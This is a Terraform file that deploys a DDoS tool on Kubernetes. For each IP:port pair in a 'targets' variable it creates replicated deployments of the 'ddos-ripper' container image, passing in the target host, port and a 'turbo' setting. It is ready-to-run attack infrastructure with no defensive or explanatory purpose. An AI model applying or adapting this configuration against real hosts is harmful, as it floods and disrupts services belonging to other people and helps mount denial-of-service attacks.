provider "kubernetes" {
  config_path = "~/.kube/config"
}

resource "kubernetes_namespace" "dripper" {
  metadata {
    name = "dripper"
  }
}

resource "kubernetes_deployment" "dripper" {
  for_each = {
    for s in split(",", var.targets) : split(":", s)[0] => split(":", s)[1]
  }

  metadata {
    name      = "dripper-ip-${replace(each.key, ".", "-")}-port-${each.value}"
    namespace = kubernetes_namespace.dripper.metadata.0.name
  }

  spec {
    replicas = var.replicas

    selector {
      match_labels = {
        app = "dripper-ip-${replace(each.key, ".", "-")}-port-${each.value}"
      }
    }

    template {
      metadata {
        labels = {
          app = "dripper-ip-${replace(each.key, ".", "-")}-port-${each.value}"
        }
      }

      spec {
        container {
          image = "kuchkovsky/ddos-ripper:latest"
          name  = "dripper-ip-${replace(each.key, ".", "-")}-port-${each.value}"
          args  = ["-s", each.key, "-p", each.value, "-t", var.turbo]

          port {
            container_port = each.value
          }

          resources {
            limits = {
              memory = "512Mi"
            }
          }
        }
      }
    }
  }
}
